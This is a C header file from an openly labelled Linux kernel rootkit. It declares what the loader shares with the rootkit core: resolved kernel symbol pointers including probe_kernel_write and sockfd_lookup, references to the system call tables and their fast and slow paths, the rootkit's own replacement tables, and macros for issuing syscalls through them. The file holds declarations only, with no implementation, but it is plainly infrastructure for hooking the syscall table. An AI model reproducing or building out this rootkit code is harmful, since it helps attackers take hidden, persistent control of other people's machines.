/*
 * Here the shared functions and variables between loader and rootkit's kernel.
 */

#ifndef KERNEL_H

/*
 * Rootkit's kernel functions.
 */
extern int pinfo(const char *fmt, ...);
extern int perr(const char *fmt, ...);
extern void kernel_test(void);
extern long syscall(void **sct, int nr, bool user, long a1, long a2, long a3, long a4, long a5, long a6);

/*
 * Symbols obtained from loader, passed to rootkit's kernel.
 */
extern void * (*f_kmalloc)(size_t size, gfp_t flags);
extern void (*f_kfree)(const void *);
extern struct pid * (*f_find_vpid)(pid_t nr);
extern int (*f_vscnprintf)(char *buf, size_t size, const char *fmt, va_list args);
extern int (*f_sys_write)(int fd, const char *mem, size_t len);
extern int (*f_printk)(const char *fmt, ...);
extern struct socket * (*f_sockfd_lookup)(int fd, int *err);
extern long (*f_probe_kernel_write)(void *dst, const void *src, size_t len);
extern int (*f_strncmp)(const char *s1, const char *s2, size_t len);
extern void *kernel_addr;
extern size_t kernel_len, kernel_paglen, kernel_pages;
extern void **sys_call_table;
extern void **ia32_sys_call_table;
extern unsigned int *psct_fastpath;
extern unsigned int *psct_slowpath;
extern unsigned int *pia32sct;
extern void **my_sct;
extern void **my_ia32sct;

/*
 * Labels.
 */
extern void kernel_start(void);
extern void kernel_end(void);

/*
 * Macros.
 */
#define KSYSCALL(nr, a1, a2, a3, a4, a5, a6) syscall(sys_call_table, nr, 0, (long)a1, (long)a2, (long)a3, (long)a4, (long)a5, (long)a6)
#define SYSCALL64(nr, a1, a2, a3, a4, a5, a6) syscall(sys_call_table, nr, 1, (long)a1, (long)a2, (long)a3, (long)a4, (long)a5, (long)a6)
#define SYSCALL32(nr, a1, a2, a3, a4, a5, a6) syscall(ia32_sys_call_table, nr, 1, (long)a1, (long)a2, (long)a3, (long)a4, (long)a5, (long)a6)
#define KADDR(symbol) (void *)(kernel_addr + ((long)&symbol - (long)&kernel_start))

#define KERNEL_H

#endif
